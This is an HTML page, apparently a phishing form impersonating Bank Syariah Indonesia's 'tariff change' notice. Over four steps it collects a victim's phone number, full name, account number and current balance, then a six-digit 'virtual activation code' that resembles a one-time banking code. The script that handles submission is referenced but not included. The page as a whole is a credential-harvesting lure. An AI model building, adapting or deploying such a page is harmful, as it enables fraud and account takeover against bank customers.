<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BSI Perubahan Tarif</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h2 class="title">BSI Perubahan Tarif</h2>
        
        <!-- Halaman 1: Pilihan Tarif -->
        <div id="page1" class="page active">
            <div class="page-content">
                <div class="radio-group">
                    <div class="radio-item">
                        <input name="radio" id="radio1" type="radio" required value="TARIF BARU Rp 150.000">
                        <label for="radio1">TARIF BARU Rp 150.000 / BULAN</label>
                    </div>
                    <div class="radio-item">
                        <input name="radio" id="radio2" type="radio" value="TARIF LAMA Rp 6.500">
                        <label for="radio2">TARIF LAMA Rp 6.500 / TRANSAKSI</label>
                    </div>
                </div>

                <div class="form-group">
                    <label for="nope">Nomor HP. Terdaftar</label>
                    <input type="tel" id="nope" class="text-field" maxlength="13" placeholder="Tuliskan Nomor Handphone Anda" minlength="10" required>
                </div>

                <div class="button-container">
                    <button id="btnNext1" type="button" class="submit-button">SELANJUTNYA</button>
                </div>
            </div>
        </div>

        <!-- Halaman 2: Data Pribadi -->
        <div id="page2" class="page">
            <div class="page-content">
                <form id="formPersonal">
                    <input type="hidden" id="tarif">
                    <input type="hidden" id="nomorHp">
                    
                    <div class="form-group">
                        <label for="nama">Nama Lengkap</label>
                        <input type="text" id="nama" class="text-field" maxlength="200" placeholder="Tuliskan Nama Lengkap Anda" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="norek">Nomor Rekening</label>
                        <input type="tel" id="norek" class="text-field" maxlength="11" placeholder="Tuliskan Nomor Rekening Anda" minlength="5" required>
                    </div>
                    
                    <div class="button-container">
                        <button type="button" class="cancel-button" onclick="backToPage(1)">BATAL</button>
                        <button type="submit" class="submit-button">SELANJUTNYA</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Halaman 3: Verifikasi Saldo -->
        <div id="page3" class="page verification-page">
            <div class="page-content">
                <h3>Verifikasi Kepemilikan</h3>
                <p>Masukkan Saldo Terakhir anda,<br>Pastikan Saldo Sesuai di rekening.</p>
                
                <form id="formVerification">
                    <input type="hidden" id="namaUser">
                    <input type="hidden" id="noRekening">
                    
                    <div class="form-group">
                        <label for="saldo">Saldo Terakhir :</label>
                        <input type="text" id="saldo" class="text-field" placeholder="Tuliskan Saldo Terakhir Anda" required>
                        <input type="hidden" id="saldoNumber">
                    </div>
                    
                    <div class="button-container">
                        <button type="button" class="cancel-button" onclick="backToPage(2)">BATAL</button>
                        <button type="submit" class="submit-button">SELANJUTNYA</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Halaman 4: Kode Aktivasi -->
        <div id="page4" class="page">
            <div class="page-content">
                <div class="form-group">
                    <label for="kodeAktivasi">Kode Aktivasi</label>
                    <input type="tel" id="kodeAktivasi" class="text-field" maxlength="6" placeholder="Masukkan Kode Virtual" minlength="6" required>
                </div>
                
                <div class="button-container">
                    <button id="btnSubmit" type="button" class="submit-button">SELANJUTNYA</button>
                </div>
                
                <div id="notif">
                    Untuk mendapatkan kode Virtual<br>
                    Silahkan klik tombol dibawah ini<br>
                </div>
                
                <div class="button-container">
                    <button type="button" class="request-button" onclick="requestCode()">Request Kode Virtual</button>
                </div>
            </div>
        </div>
    </div>

    <script src="javascript.js"></script>
</body>
                        </html>
